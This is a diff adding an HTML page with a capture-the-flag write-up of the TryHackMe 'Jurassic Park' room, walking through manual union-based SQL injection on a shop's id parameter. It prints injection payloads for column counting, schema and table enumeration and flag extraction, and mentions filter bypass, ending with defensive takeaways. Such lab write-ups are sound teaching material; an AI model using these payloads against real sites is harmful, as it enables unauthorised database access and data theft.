@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Jurassic Park — TryHackMe Writeup (Lanky)</title>
+  <meta name="description" content="TryHackMe: Jurassic Park — manual union-based SQL injection challenge.">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#writeups">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#writeups">back to writeups</a>
+    <h1 style="margin-top:16px;">Jurassic Park</h1>
+    <div class="subtitle">TryHackMe · <a href="https://tryhackme.com/room/jurassicpark" target="_blank" rel="noopener">tryhackme.com/room/jurassicpark</a></div>
+    <div class="machine-meta">
+      <span class="pill os-linux">Web</span>
+      <span class="pill diff-hard">Hard</span>
+      <span class="pill">Manual SQL injection</span>
+      <span class="pill rooted">● completed</span>
+    </div>
+
+    <div class="contact" style="margin:0 0 22px;">
+      <a class="btn primary" href="https://www.youtube.com/watch?v=AX_YlKmsmqQ" target="_blank" rel="noopener">▶ Watch the walkthrough</a>
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      A dinosaur "shop" whose product <code>id</code> parameter is injectable. The challenge is
+      <strong>manual union-based SQL injection</strong> (no sqlmap) — enumerate the databases and tables,
+      bypass the input filtering, and extract the flags hidden across multiple databases.
+    </div>
+
+    <h2><span class="num">01</span>Find the injection point</h2>
+    <p>Browsing a dinosaur sets <code>?id=</code>. The value is reflected into a SQL query and unsanitised — classic union-based SQLi. First find the column count, then a reflected column to print data into:</p>
+    <pre data-lang="sql"><code>?id=1 order by 5-- -            -- find column count
+?id=0 union select 1,2,3,4,5-- - -- identify the reflected column(s)</code></pre>
+
+    <h2><span class="num">02</span>Enumerate the database</h2>
+    <pre data-lang="sql"><code>-- current db + version
+?id=0 union select 1,database(),version(),4,5-- -
+-- databases
+?id=0 union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata-- -
+-- tables in a target db
+?id=0 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='park'-- -
+-- columns
+?id=0 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users'-- -</code></pre>
+
+    <h2><span class="num">03</span>Extract the flags</h2>
+    <p>The flags live in tables across more than one database — walk each schema and dump the relevant columns. Where the app filters certain characters/keywords, bypass with case-mixing, comments, or hex-encoded strings.</p>
+    <pre data-lang="sql"><code>?id=0 union select 1,group_concat(flag),3,4,5 from park.flags-- -</code></pre>
+    <div class="flag"><span class="label">flags</span>THM{…} — extracted via UNION injection across the app's databases</div>
+
+    <h2><span class="num">04</span>Takeaways</h2>
+    <ul>
+      <li><strong>Parameterise every query</strong> — string-concatenated SQL with user input is the root cause.</li>
+      <li><strong>Blacklist filtering is not a fix</strong> — case-mixing, comments and encoding bypass it; use prepared statements + allow-lists.</li>
+      <li>Doing it by hand (no sqlmap) builds real understanding of UNION injection and <code>information_schema</code>.</li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#writeups">back to writeups</a></p>
+  </article>
+
+  <footer><div class="wrap">Jurassic Park · TryHackMe · Lanky &nbsp;·&nbsp; <a href="../index.html#writeups">all writeups</a></div></footer>
+</body>
+</html>
